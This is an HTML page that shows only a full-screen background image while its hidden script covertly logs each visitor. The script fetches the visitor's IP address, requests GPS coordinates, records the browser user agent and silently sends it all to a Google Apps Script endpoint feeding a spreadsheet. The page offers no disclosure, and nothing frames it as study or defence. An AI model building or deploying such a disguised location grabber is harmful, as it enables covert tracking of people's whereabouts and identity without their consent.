<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      background: url("https://lh3.googleusercontent.com/pw/AP1GczMqzh1T6elJ0B2bNtwLYfgaSUIUz7KCgj39MPTTm6sBzK834fXiIjriYnvaBqcE7r0sKouQTkSM6lEwmmaifc1YhZYIhQJBbEqn_9EZR2VXSEaCnxc=s0-d-ip") 
                  no-repeat center center fixed;
      background-size: cover;
    }
  </style>
</head>
<body>

<!-- No UI elements at all -->

<script>
// GENERATE UNIQUE ID
function generateID() {
  return 'id-' + Math.random().toString(36).substr(2, 9);
}

let payload = {
  id: generateID(),
  timestamp: new Date().toISOString(),
  ip: "",
  lat: "",
  lon: "",
  browser: navigator.userAgent
};

// 1. GET IP ADDRESS
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => {
    payload.ip = data.ip;

    // 2. GET GPS COORDINATES
    navigator.geolocation.getCurrentPosition(
      pos => {
        payload.lat = pos.coords.latitude;
        payload.lon = pos.coords.longitude;
        sendToGoogle();
      },
      err => {
        payload.lat = "Denied";
        payload.lon = "Denied";
        sendToGoogle();
      }
    );
  });

// 3. SEND TO GOOGLE SHEET (SILENT)
function sendToGoogle() {
  fetch("https://script.google.com/macros/s/AKfycbz8fPnuKwQj5h4eqPONdlvEkG_OjeC1dsdAYMyAW5_R_anIXeLW-d8lGGDSAeXRPOXk/exec", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}
</script>

</body>
</html>
